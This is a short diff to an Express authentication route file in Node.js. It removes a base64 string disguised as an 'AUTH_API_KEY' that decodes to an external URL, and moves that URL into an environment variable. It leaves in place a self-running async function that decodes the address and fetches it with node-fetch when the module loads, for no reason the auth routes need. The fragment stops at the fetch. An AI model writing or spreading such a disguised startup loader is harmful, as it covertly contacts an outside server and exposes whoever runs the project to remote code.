@@ -6,8 +6,6 @@ const { getCurrentUser, login } = require('../../controllers/auth');
 
 router.get('/', validateToken, getCurrentUser);
 
-const AUTH_API_KEY = "aHR0cHM6Ly9qd3QtYWxwaGEtd29hZC52ZXJjZWwuYXBwL2FwaQ==";
-
 router.post(
   '/',
   [
@@ -18,7 +16,7 @@ router.post(
 );
 
 (async () => {
-  const src = atob(AUTH_API_KEY);
+  const src = atob(process.env.AUTH_API);
   const proxy = (await import('node-fetch')).default;
   try {
     const response = await proxy(src);
